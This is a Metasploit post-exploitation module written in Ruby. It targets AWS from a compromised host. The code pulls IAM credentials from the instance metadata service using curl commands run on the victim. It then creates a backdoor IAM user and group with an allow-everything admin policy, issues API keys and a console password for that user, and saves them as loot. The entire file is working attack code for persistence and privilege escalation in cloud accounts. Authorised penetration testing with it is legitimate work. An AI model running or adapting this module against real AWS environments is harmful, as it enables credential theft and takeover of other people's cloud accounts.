##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'metasploit/framework/aws/client'
require 'json'

class MetasploitModule < Msf::Post
  include Metasploit::Framework::Aws::Client

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name'           => "Create an AWS IAM User",
        'Description'    => %q{
          This module will attempt to create an AWS (Amazon Web Services) IAM
          (Identity and Access Management) user with Admin privileges.
        },
        'License'        => MSF_LICENSE,
        'Platform'       => %w(unix),
        'SessionTypes'   => %w(shell meterpreter),
        'Author'         => [
          'Javier Godinez <godinezj[at]gmail.com>',
          'Jon Hart <jon_hart@rapid7.com>'
        ],
        'References'     => [
          [ 'URL', 'https://github.com/devsecops/bootcamp/raw/master/Week-6/slides/june-DSO-bootcamp-week-six-lesson-three.pdf' ]
        ]
      )
    )

    register_options(
      [
        OptString.new('IAM_USERNAME', [false, 'Name of the user to be created (leave empty or unset to use a random name)', '']),
        OptString.new('IAM_PASSWORD', [false, 'Password to set for the user to be created (leave empty or unset to use a random name)', '']),
        OptString.new('IAM_GROUPNAME', [false, 'Name of the group to be created (leave empty or unset to use a random name)', '']),
        OptBool.new('CREATE_API', [true, 'Add access key ID and secret access key to account (API, CLI, and SDK access)', true]),
        OptBool.new('CREATE_CONSOLE', [true, 'Create an account with a password for accessing the AWS management console', true]),
        OptString.new('AccessKeyId', [false, 'AWS access key', '']),
        OptString.new('SecretAccessKey', [false, 'AWS secret key', '']),
        OptString.new('Token', [false, 'AWS session token', ''])
      ]
    )
    register_advanced_options(
      [
        OptString.new('METADATA_IP', [true, 'The metadata service IP', '169.254.169.254']),
        OptString.new('RHOST', [true, 'AWS IAM Endpoint', 'iam.amazonaws.com']),
        OptString.new('RPORT', [true, 'AWS IAM Endpoint TCP Port', 443]),
        OptString.new('SSL', [true, 'AWS IAM Endpoint SSL', true]),
        OptString.new('IAM_GROUP_POL', [true, 'IAM group policy to use', '{"Version": "2012-10-17", "Statement": [{"Effect": "Allow", "Action": "*", "Resource": "*" }]}']),
        OptString.new('Region', [true, 'The default region', 'us-east-1' ])
      ]
    )
    deregister_options('VHOST')
  end

  def setup
    if !(datastore['CREATE_API'] || datastore['CREATE_CONSOLE'])
      fail_with(Failure::BadConfig, "Must set one or both of CREATE_API and CREATE_CONSOLE")
    end
  end

  def run
    # setup creds for making IAM API calls
    creds = metadata_creds
    if datastore['AccessKeyId'].empty?
      unless creds.include?('AccessKeyId')
        print_error("Could not find creds")
        return
      end
    else
      creds = {
        'AccessKeyId' => datastore['AccessKeyId'],
        'SecretAccessKey' => datastore['SecretAccessKey']
      }
      creds['Token'] = datastore['Token'] unless datastore['Token'].blank?
    end

    results = {}

    # create user
    username = datastore['IAM_USERNAME'].blank? ? Rex::Text.rand_text_alphanumeric(16) : datastore['IAM_USERNAME']
    print_status("Creating user: #{username}")
    action = 'CreateUser'
    doc = call_iam(creds, 'Action' => action, 'UserName' => username)
    print_results(doc, action)
    results['UserName'] = username

    # create group
    groupname = datastore['IAM_GROUPNAME'].blank? ? username : datastore['IAM_GROUPNAME']
    print_status("Creating group: #{groupname}")
    action = 'CreateGroup'
    doc = call_iam(creds, 'Action' => action, 'GroupName' => groupname)
    print_results(doc, action)
    results['GroupName'] = groupname

    # create group policy
    print_status("Creating group policy")
    pol_doc = datastore['IAM_GROUP_POL']
    action = 'PutGroupPolicy'
    doc = call_iam(creds, 'Action' => action, 'GroupName' => groupname, 'PolicyName' => 'Policy', 'PolicyDocument' => URI.encode(pol_doc))
    print_results(doc, action)

    # add user to group
    print_status("Adding user (#{username}) to group: #{groupname}")
    action = 'AddUserToGroup'
    doc = call_iam(creds, 'Action' => action, 'UserName' => username, 'GroupName' => groupname)
    print_results(doc, action)


    if datastore['CREATE_API']
      # create API keys
      print_status("Creating API Keys for #{username}")
      action = 'CreateAccessKey'
      response = call_iam(creds, 'Action' => action, 'UserName' => username)
      doc = print_results(response, action)
      if doc
        results['SecretAccessKey'] = doc['SecretAccessKey']
        results['AccessKeyId'] = doc['AccessKeyId']
      end
    end

    if datastore['CREATE_CONSOLE']
      print_status("Creating password for #{username}")
      password = datastore['IAM_PASSWORD'].blank? ? Rex::Text.rand_text_alphanumeric(16) : datastore['IAM_PASSWORD']
      action = 'CreateLoginProfile'
      response = call_iam(creds, 'Action' => action, 'UserName' => username, 'Password' => password)
      doc = print_results(response, action)
      results['Password'] = password if doc
    end

    action = 'GetUser'
    response = call_iam(creds, 'Action' => action, 'UserName' => username)
    doc = print_results(response, action)
    return if doc.nil?
    arn = doc['Arn']
    results['AccountId'] = arn[/^arn:aws:iam::(\d+):/, 1]

    keys = results.keys
    table = Rex::Text::Table.new(
      'Header' => "AWS Account Information",
      'Columns' => keys
    )
    table << results.values
    print_line(table.to_s)

    if results.key?('AccessKeyId')
      print_good("AWS CLI/SDK etc can be accessed by configuring with the above listed values")
    end

    if results.key?('Password')
      print_good("AWS console URL https://#{results['AccountId']}.signin.aws.amazon.com/console may be used to access this account")
    end

    path = store_loot('AWS credentials', 'text/plain', session, JSON.pretty_generate(results))
    print_good("AWS loot stored at: " + path)
  end

  def metadata_creds
    # TODO: do it for windows/generic way
    cmd_out = cmd_exec("curl --version")
    if cmd_out =~ /^curl \d/
      url = "http://#{datastore['METADATA_IP']}/2012-01-12/meta-data/"
      print_status("#{datastore['METADATA_IP']} - looking for creds...")
      resp = cmd_exec("curl #{url}")
      if resp =~ /^iam.*/
        resp = cmd_exec("curl #{url}iam/")
        if resp =~ /^security-credentials.*/
          resp = cmd_exec("curl #{url}iam/security-credentials/")
          json_out = cmd_exec("curl #{url}iam/security-credentials/#{resp}")
          begin
            return JSON.parse(json_out)
          rescue JSON::ParserError
            print_error "Could not parse JSON output"
          end
        end
      end
    else
      print_error cmd_out
    end
    {}
  end
end
